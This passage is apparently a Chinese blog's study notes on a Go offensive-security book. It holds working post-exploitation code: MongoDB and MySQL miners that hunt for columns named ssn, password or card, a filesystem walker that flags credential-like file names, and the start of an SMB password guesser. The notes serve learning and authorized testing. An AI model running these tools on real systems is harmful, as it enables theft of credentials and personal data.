class="line">    s, err := m.GetSchema()     <span class="comment">//检索模式(遍历)</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re := getRegex()   <span class="comment">//正则表达式</span></span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;  <span class="comment">//开始检索</span></span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> database.Tables &#123;</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> table.Columns &#123; <span class="comment">//取字段数据</span></span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> re &#123;   <span class="comment">//遍历取出re中的数据</span></span><br><span class="line"><span class="keyword">if</span> r.MatchString(value) &#123;  <span class="comment">//比较值</span></span><br><span class="line">fmt.Println(database)</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getRegex</span><span class="params">()</span></span> []*regexp.Regexp &#123;  <span class="comment">//正则，且不区分大小写</span></span><br><span class="line"><span class="keyword">return</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)social`</span>),  </span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ssn`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)pass(word)?`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)hash`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ccnum`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)card`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)security`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)key`</span>),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Schema)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> ret <span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line">ret += fmt.Sprint(database.String() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Database)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;[DB] = %+s\n&quot;</span>, d.Name)</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> d.Tables &#123;</span><br><span class="line">ret += table.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t Table)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;    [TABLE] = %+s\n&quot;</span>, t.Name)</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> t.Columns &#123;</span><br><span class="line">ret += fmt.Sprintf(<span class="string">&quot;       [COL] = %+s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-实现一个MongoDB数据库矿工"><a href="#2-实现一个MongoDB数据库矿工" class="headerlink" title="2.实现一个MongoDB数据库矿工"></a>2.实现一个MongoDB数据库矿工</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;github.com/blackhat-go/bhg/ch-7/db/dbminer&quot;</span> <span class="comment">//接口</span></span><br><span class="line">   <span class="string">&quot;gopkg.in/mgo.v2&quot;</span></span><br><span class="line">   <span class="string">&quot;gopkg.in/mgo.v2/bson&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MongoMiner <span class="keyword">struct</span> &#123; <span class="comment">//MongoMiner结构体</span></span><br><span class="line">   Host    <span class="type">string</span></span><br><span class="line">   session *mgo.Session</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*******New()实现新实例的创建******/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host <span class="type">string</span>)</span></span> (*MongoMiner, <span class="type">error</span>) &#123;</span><br><span class="line">   m := MongoMiner&#123;Host: host&#125;</span><br><span class="line">   err := m.connect()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;m, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MongoMiner)</span></span> connect() <span class="type">error</span> &#123; <span class="comment">//数据库连接函数</span></span><br><span class="line">   s, err := mgo.Dial(m.Host)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   &#125;</span><br><span class="line">   m.session = s</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*******接口函数GetSchema()的实现***********/</span></span><br><span class="line"><span class="comment">//实现拿取MongoDB的数据库结构</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MongoMiner)</span></span> GetSchema() (*dbminer.Schema, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> s = <span class="built_in">new</span>(dbminer.Schema)</span><br><span class="line"></span><br><span class="line">   dbnames, err := m.session.DatabaseNames() <span class="comment">//首席按检索库集</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, dbname := <span class="keyword">range</span> dbnames &#123; <span class="comment">//遍历库集</span></span><br><span class="line">      db := dbminer.Database&#123;Name: dbname, Tables: []dbminer.Table&#123;&#125;&#125;</span><br><span class="line">      collections, err := m.session.DB(dbname).CollectionNames()</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> _, collection := <span class="keyword">range</span> collections &#123; <span class="comment">//检索集合名称</span></span><br><span class="line">         table := dbminer.Table&#123;Name: collection, Columns: []<span class="type">string</span>&#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">var</span> docRaw bson.Raw  <span class="comment">//该文档与典型的MongoDB查询不同，它使用了懒散反序列化</span></span><br><span class="line">         err := m.session.DB(dbname).C(collection).Find(<span class="literal">nil</span>).One(&amp;docRaw)</span><br><span class="line">         <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">var</span> doc bson.RawD</span><br><span class="line">         <span class="keyword">if</span> err := docRaw.Unmarshal(&amp;doc); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span> _, f := <span class="keyword">range</span> doc &#123; <span class="comment">//检索原始文档</span></span><br><span class="line">            table.Columns = <span class="built_in">append</span>(table.Columns, f.Name)</span><br><span class="line">         &#125;</span><br><span class="line">         db.Tables = <span class="built_in">append</span>(db.Tables, table) <span class="comment">//收集表</span></span><br><span class="line">      &#125;</span><br><span class="line">      s.Databases = <span class="built_in">append</span>(s.Databases, db) <span class="comment">//收集库</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   mm, err := New(os.Args[<span class="number">1</span>]) <span class="comment">//传递数据库的IP地址</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err := dbminer.Search(mm); err != <span class="literal">nil</span> &#123; <span class="comment">//调用包内方法</span></span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131134821130.png" alt="image-20230131134821130"></p><h4 id="3-实现一个MySQL数据库矿工"><a href="#3-实现一个MySQL数据库矿工" class="headerlink" title="3.实现一个MySQL数据库矿工"></a>3.实现一个MySQL数据库矿工</h4><ul><li><p>目标是检查schema.columns信息，该表维护MySQL的所有元数据。</p></li><li><p>建议使用以下SQL查询语句，删除一些内置MySQL数据库的信息(这些信息对掠夺没有任何影响)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, table_name, column_name <span class="keyword">from</span> columns <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;information_schema&#x27;</span>, <span class="string">&#x27;performance_schema&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>) <span class="keyword">order</span> <span class="keyword">by</span> table_schema, table_name</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131141400135.png" alt="image-20230131141400135"></p></li><li><p>尽管MySQL的查询检索模式信息很简单。</p></li><li><p>但代码的复杂性来自于定义函数GetSchema()时，逻辑上会尝试区分和分类每一行。</p></li><li><p>比如说：输出的连续行可能属于或不属于同一数据库或表，因此将这些行与正确的dbminer.Database和dbminer.Table实例相关联变得有些棘手</p></li><li><p>但我们可以维护变量来跟踪当前行中的信息，并将其与上一行中的数据进行比较，以确定是否遇到了新的数据库或表。这不是最优雅的解决方案，但可以完成工作。</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/blackhat-go/bhg/ch-7/db/dbminer&quot;</span></span><br><span class="line">   _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">type</span> MySQLMiner <span class="keyword">struct</span> &#123;</span><br><span class="line">   Host <span class="type">string</span></span><br><span class="line">   Db   sql.DB</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*******New()实现新实例的创建******/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host <span class="type">string</span>)</span></span> (*MySQLMiner, <span class="type">error</span>) &#123;</span><br><span class="line">   m := MySQLMiner&#123;Host: host&#125;</span><br><span class="line">   err := m.connect()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;m, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> connect() <span class="type">error</span> &#123; <span class="comment">//Mysql连接</span></span><br><span class="line"></span><br><span class="line">   db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, fmt.Sprintf(<span class="string">&quot;root:password@tcp(%s:3306)/information_schema&quot;</span>, m.Host))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   m.Db = *db</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> GetSchema() (*dbminer.Schema, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> s = <span class="built_in">new</span>(dbminer.Schema)</span><br><span class="line"></span><br><span class="line">   sql := <span class="string">`SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns</span></span><br><span class="line"><span class="string">   WHERE TABLE_SCHEMA NOT IN (&#x27;mysql&#x27;, &#x27;information_schema&#x27;, &#x27;performance_schema&#x27;, &#x27;sys&#x27;)</span></span><br><span class="line"><span class="string">   ORDER BY TABLE_SCHEMA, TABLE_NAME`</span>  <span class="comment">//sql查询语句</span></span><br><span class="line">   schemarows, err := m.Db.Query(sql)  <span class="comment">//查询数据结果(*Row)</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> schemarows.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> prevschema, prevtable <span class="type">string</span> <span class="comment">//创建变量跟踪当前行的信息</span></span><br><span class="line">   <span class="keyword">var</span> db dbminer.Database  <span class="comment">//当前库，存放表</span></span><br><span class="line">   <span class="keyword">var</span> table dbminer.Table  <span class="comment">//当前表，存放列</span></span><br><span class="line">   <span class="keyword">for</span> schemarows.Next() &#123; <span class="comment">//遍历结果，目的是为了区分不同数据库或表的数据</span></span><br><span class="line">      <span class="keyword">var</span> currschema, currtable, currcol <span class="type">string</span></span><br><span class="line">      <span class="keyword">if</span> err := schemarows.Scan(&amp;currschema, &amp;currtable, &amp;currcol); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         1.检查当前行的库名是否与上一行不同</span></span><br><span class="line"><span class="comment">         2.如果是，创建新的miner.Database实例</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> currschema != prevschema &#123;</span><br><span class="line">         <span class="keyword">if</span> prevschema != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">            db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">            s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line">         &#125;</span><br><span class="line">         db = dbminer.Database&#123;Name: currschema, Tables: []dbminer.Table&#123;&#125;&#125;</span><br><span class="line">         prevschema = currschema</span><br><span class="line">         prevtable = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         1.检查当前行的表名是否与上一行不同</span></span><br><span class="line"><span class="comment">         2.如果是，创建新的miner.Table实例</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> currtable != prevtable &#123;</span><br><span class="line">         <span class="keyword">if</span> prevtable != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">            db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">         &#125;</span><br><span class="line">         table = dbminer.Table&#123;Name: currtable, Columns: []<span class="type">string</span>&#123;&#125;&#125;</span><br><span class="line">         prevtable = currtable</span><br><span class="line">      &#125;</span><br><span class="line">      table.Columns = <span class="built_in">append</span>(table.Columns, currcol)</span><br><span class="line">   &#125;</span><br><span class="line">   db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">   s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line">   <span class="keyword">if</span> err := schemarows.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   mm, err := New(os.Args[<span class="number">1</span>])</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> mm.Db.Close() <span class="comment">//和MongoDB不同的是，需要关闭连接</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := dbminer.Search(mm); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>输出结果与上个MongoDB示例的几乎没有区别，这是因为dbminer.Schema模式没有生成函数dbminer.Search()的任何输出。</p></li><li><p>这就是接口的力量，统一性和重用性</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230202121458463.png" alt="image-20230202121458463"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.3掠夺文件系统</title>
      <link href="/2023/02/01/Go/7.3%E6%8E%A0%E5%A4%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/02/01/Go/7.3%E6%8E%A0%E5%A4%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<ul><li>以递归方式遍历用户提供的文件系统路径，并与一系列有兴趣的文件名匹配</li><li>这些文件名在后渗透的工作中可能有用(可能包含凭证或敏感信息)</li></ul><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">   <span class="string">&quot;path/filepath&quot;</span>  <span class="comment">//轻松遍历目录结构</span></span><br><span class="line">   <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> regexes = []*regexp.Regexp&#123;    <span class="comment">//正则匹配集</span></span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)user`</span>),</span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)password`</span>),</span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)kdb`</span>),</span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)login`</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">walkFn</span><span class="params">(path <span class="type">string</span>, f os.FileInfo, err <span class="type">error</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> _, r := <span class="keyword">range</span> regexes &#123;</span><br><span class="line">      <span class="keyword">if</span> r.MatchString(path) &#123;</span><br><span class="line">         fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, path)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   root := os.Args[<span class="number">1</span>]  <span class="comment">//获取命令行参数</span></span><br><span class="line">   <span class="keyword">if</span> err := filepath.Walk(root, walkFn); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131150858728.png" alt="image-20230131150858728"></p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131150914316.png" alt="image-20230131150914316"></p><h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><ol><li>包含更多特定的正则表达式</li><li>仅对文件名而不对目录应用正则表达式检查<ul><li>为什么要这样？看下面这个案例。1是空目录，空目录命中条件输出对我们获取敏感信息没有任何帮助</li><li><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131151429861.png" alt="image-20230131151429861"></li></ul></li><li>查找和标记包含最近修改或访问时间的特定文件</li></ol>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.与SMB和NTLM交互</title>
      <link href="/2023/02/01/Go/6.%E4%B8%8ESMB%E5%92%8CNTLM%E4%BA%A4%E4%BA%92/"/>
      <url>/2023/02/01/Go/6.%E4%B8%8ESMB%E5%92%8CNTLM%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<p>SMB具有多种用途，但通常用于在网上共享资源，例如文件、打印机和串行端口。且SMB允许你通过命名管道在分布式网络节点之间进行进程通信，也就是允许我们在远程主机上执行任意命令。这需要用到PsExec。而同时SMB也被证明是针对Windows系统后渗透最有用的协议。</p><p>SMB还有一些其他有趣的用途，这主要得益于它处理NT LAN Manager（NTLM）身份验证的方式，该身份验证是Windows网络上大量使用的质询-响应安全协议。这些用途包括远程密码猜解、给予散列的身份验证、SMB中继和NBNS&#x2F;LLMNR欺骗。</p><p>而在go中还没有一个正式的SMB包来让我们进行与SMB的交互，于是本书作者创建了一个与本书配套的SMB包供我们使用。</p><p>具体地址：<a href="https://github.com/blackhat-go/bhg/ch-6/smb">https://github.com/blackhat-go/bhg/ch-6/smb</a></p><h2 id="使用SMB包猜解密码"><a href="#使用SMB包猜解密码" class="headerlink" title="使用SMB包猜解密码"></a>使用SMB包猜解密码</h2><p>go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/smb&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span 